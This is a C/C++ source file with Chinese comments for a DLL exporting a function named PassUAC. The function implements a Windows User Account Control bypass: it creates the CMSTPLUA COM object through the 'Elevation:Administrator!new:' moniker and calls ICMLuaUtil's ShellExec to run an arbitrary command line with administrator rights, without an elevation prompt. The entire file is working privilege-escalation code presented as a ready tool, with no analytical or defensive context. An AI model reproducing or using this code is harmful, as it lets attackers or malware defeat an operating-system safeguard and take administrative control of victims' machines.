#include <Windows.h>
#include <objbase.h>
#include <tchar.h>
#include <strsafe.h>

#define DLL_EXPORT
#include "PassUAC.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

// 导出函数
VOID CALLBACK PassUAC(HWND hwnd, HINSTANCE hInstance, LPSTR lpCmdLine, int nCmdShow)
{
    CLSID clsid;
    IID iid;
    ICMLuaUtil* pCMLuaUtil = NULL;
    LPVOID pVoid = NULL;

    // CMSTPLUA组件的CLSID：3E5FC7F9-9A51-4367-9063-A120244FBEC7
    CLSIDFromString(L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", &clsid);

    // ICMLuaUtil接口的IID：6EDD6D74-C007-4E75-B76A-E5740995E24C
    IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &iid);

    // 初始化COM库
    CoInitializeEx(NULL, 0);

    // 以管理员权限创建COM对象，返回ICMLuaUtil接口的指针
    CoCreateInstanceAsAdmin(NULL, clsid, iid, (LPVOID*)&pCMLuaUtil);

    // 命令行参数转换为宽字节
    int nCchWideChar = MultiByteToWideChar(CP_ACP, 0, lpCmdLine, -1, NULL, 0);
    WCHAR* lpWideCharStr = new WCHAR[nCchWideChar];
    MultiByteToWideChar(CP_ACP, 0, lpCmdLine, -1, lpWideCharStr, nCchWideChar);
    // 启动程序
    pCMLuaUtil->lpVtbl->ShellExec(pCMLuaUtil, lpWideCharStr, NULL, NULL, 0, SW_SHOWNORMAL);

    // 清理工作
    pCMLuaUtil->lpVtbl->Release(pCMLuaUtil);
    delete[] lpWideCharStr;
    CoUninitialize();
}

// 内部函数
HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, LPVOID* ppVoid)
{
    WCHAR wszCLSID[50] = { 0 };
    WCHAR wszDisplayName[300] = { 0 };
    BIND_OPTS3 bindOpts3;

    // 构造显示名称，格式：Elevation:Administrator!new:{guid}
    StringFromGUID2(rclsid, wszCLSID, _countof(wszCLSID));
    StringCchPrintfW(wszDisplayName, _countof(wszDisplayName), L"Elevation:Administrator!new:%s", wszCLSID);

    ZeroMemory(&bindOpts3, sizeof(BIND_OPTS3));
    bindOpts3.cbStruct = sizeof(BIND_OPTS3);
    bindOpts3.dwClassContext = CLSCTX_LOCAL_SERVER;
    bindOpts3.hwnd = hwnd;

    // 根据显示名称创建名字对象，返回riid参数指定的接口指针
    return CoGetObject(wszDisplayName, &bindOpts3, riid, ppVoid);
}